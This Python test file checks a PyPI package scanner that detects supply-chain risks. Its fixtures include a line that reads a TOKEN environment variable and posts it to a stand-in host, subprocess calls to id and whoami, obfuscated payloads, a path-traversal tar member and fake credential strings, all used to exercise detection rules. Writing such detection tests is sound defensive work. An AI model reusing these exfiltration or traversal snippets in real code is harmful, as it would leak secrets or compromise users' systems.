from __future__ import annotations

import json
import tarfile
import zipfile

from pypi_ai.intelligence import Advisory
from pypi_ai.scanner import scan_path


def test_scan_path_finds_static_environment_and_network_evidence(tmp_path) -> None:
    package_dir = tmp_path / "suspicious_pkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text(
        "import os\n"
        "import requests\n"
        "token = os.environ.get('TOKEN')\n"
        "requests.post('https://example.invalid/upload', data={'token': token})\n",
        encoding="utf-8",
    )

    result = scan_path(package_dir)

    rule_ids = {finding.rule_id for finding in result.findings}
    assert "PY001_ENV_ACCESS" in rule_ids
    assert "PY003_NETWORK_CLIENT" in rule_ids
    assert result.summary.total_findings >= 2
    assert result.risk.score > 0
    assert result.findings[0].file_path.endswith(".py")


def test_scan_path_deduplicates_same_rule_on_same_line(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text(
        "import base64\npayload = base64.b64decode('MSArIDE=').decode()\n",
        encoding="utf-8",
    )

    result = scan_path(package_dir)
    obfuscation_findings = [
        finding for finding in result.findings if finding.rule_id == "PY004_OBFUSCATION"
    ]

    assert len(obfuscation_findings) == 1


def test_scan_path_reads_pyproject_metadata(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "pyproject.toml").write_text(
        '[project]\nname = "actual-name"\nversion = "2.3.4"\n',
        encoding="utf-8",
    )
    (package_dir / "module.py").write_text("eval('1')\n", encoding="utf-8")

    result = scan_path(package_dir)

    assert result.findings[0].package_name == "actual-name"
    assert result.findings[0].package_version == "2.3.4"


def test_invalid_pyproject_does_not_block_static_scan(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "pyproject.toml").write_text("[project\n", encoding="utf-8")
    (package_dir / "module.py").write_text("eval('1')\n", encoding="utf-8")

    result = scan_path(package_dir)

    assert result.findings[0].package_name == "pkg"
    assert result.findings[0].rule_id == "PY005_DYNAMIC_EXEC"


def test_scan_path_detects_alias_aware_ast_behavior(tmp_path) -> None:
    package_dir = tmp_path / "aliaspkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text(
        "import subprocess as sp\n"
        "from subprocess import run\n"
        "import requests as r\n"
        "sp.run(['id'])\n"
        "run(['whoami'])\n"
        "r.post('https://example.invalid/upload')\n",
        encoding="utf-8",
    )

    result = scan_path(package_dir)

    rule_ids = [finding.rule_id for finding in result.findings]
    assert "PY002_SUBPROCESS" in rule_ids
    assert "PY003_NETWORK_CLIENT" in rule_ids
    assert "PY014_IMPORT_ALIAS_RISK" in rule_ids


def test_scan_path_detects_metadata_supply_chain_signals(tmp_path) -> None:
    package_dir = tmp_path / "colourama"
    package_dir.mkdir()
    (package_dir / "pyproject.toml").write_text(
        "[project]\n"
        'name = "colourama"\n'
        'version = "1.0.0"\n'
        'authors = [{ name = "Alice", email = "alice@example.com" }]\n'
        'maintainers = [{ name = "Mallory", email = "mallory@other.invalid" }]\n'
        'dependencies = ["internal-client @ https://packages.example.invalid/internal.whl"]\n'
        "[project.urls]\n"
        'Homepage = "https://bit.ly/not-a-real-homepage"\n',
        encoding="utf-8",
    )
    (package_dir / "module.py").write_text("VALUE = 1\n", encoding="utf-8")

    result = scan_path(package_dir)

    rule_ids = {finding.rule_id for finding in result.findings}
    assert "PY009_TYPOSQUAT_RISK" in rule_ids
    assert "PY010_SUSPICIOUS_HOMEPAGE" in rule_ids
    assert "PY011_AUTHOR_MAINTAINER_MISMATCH" in rule_ids
    assert "PY012_DEPENDENCY_CONFUSION_SIGNAL" in rule_ids


def test_scan_path_detects_secret_patterns_in_code(tmp_path) -> None:
    package_dir = tmp_path / "secretpkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text(
        'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\n'
        'token = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"\n',
        encoding="utf-8",
    )

    result = scan_path(package_dir)

    assert any(finding.rule_id == "PY013_SECRET_PATTERN_IN_CODE" for finding in result.findings)


def test_scan_path_adds_osv_advisory_findings_from_database_client(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "pyproject.toml").write_text(
        '[project]\nname = "known-risk"\nversion = "1.2.3"\n',
        encoding="utf-8",
    )
    (package_dir / "module.py").write_text("VALUE = 1\n", encoding="utf-8")
    calls: list[tuple[str, str | None]] = []

    def fake_client(name: str, version: str | None) -> list[Advisory]:
        calls.append((name, version))
        return [
            Advisory(
                advisory_id="MAL-2026-9999",
                summary="Known malicious package",
                details="Public database marks this release as malicious.",
                aliases=[],
            )
        ]

    result = scan_path(package_dir, advisory_lookup=fake_client)

    assert calls == [("known-risk", "1.2.3")]
    finding = result.findings[0]
    assert finding.rule_id == "PY015_OSV_ADVISORY"
    assert finding.snippet == "MAL-2026-9999: Known malicious package"


def test_scan_path_dry_run_returns_scan_plan_without_findings(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text("print('hello')\n", encoding="utf-8")

    result = scan_path(package_dir, dry_run=True)

    assert result.summary.files_scanned == 0
    assert result.findings == []
    assert result.scan_plan is not None
    assert "folder" in result.scan_plan.input_type


def test_scan_result_json_is_serializable(tmp_path) -> None:
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "module.py").write_text("eval('1 + 1')\n", encoding="utf-8")

    result = scan_path(package_dir)
    payload = result.to_dict()

    assert json.loads(json.dumps(payload))["findings"][0]["rule_id"] == "PY005_DYNAMIC_EXEC"


def test_scan_wheel_archive_safely(tmp_path) -> None:
    wheel = tmp_path / "demo-0.1-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        archive.writestr("demo/__init__.py", "import socket\nsocket.socket()\n")

    result = scan_path(wheel)

    assert result.summary.input_type == "wheel"
    assert any(finding.rule_id == "PY003_NETWORK_CLIENT" for finding in result.findings)


def test_scan_sdist_archive_safely(tmp_path) -> None:
    source = tmp_path / "source"
    package = source / "demo"
    package.mkdir(parents=True)
    (package / "__init__.py").write_text("import pickle\npickle.loads(b'x')\n", encoding="utf-8")
    sdist = tmp_path / "demo-0.1.tar.gz"
    with tarfile.open(sdist, "w:gz") as archive:
        archive.add(source, arcname="demo-0.1")

    result = scan_path(sdist)

    assert result.summary.input_type == "sdist"
    assert any(finding.rule_id == "PY006_UNSAFE_DESERIALIZATION" for finding in result.findings)


def test_unsafe_tar_member_is_rejected(tmp_path) -> None:
    sdist = tmp_path / "bad.tar.gz"
    payload = tmp_path / "payload.py"
    payload.write_text("VALUE = 1\n", encoding="utf-8")
    with tarfile.open(sdist, "w:gz") as archive:
        archive.add(payload, arcname="../payload.py")

    try:
        scan_path(sdist)
    except ValueError as exc:
        assert "Unsafe tar member" in str(exc)
    else:
        raise AssertionError("unsafe tar member was accepted")
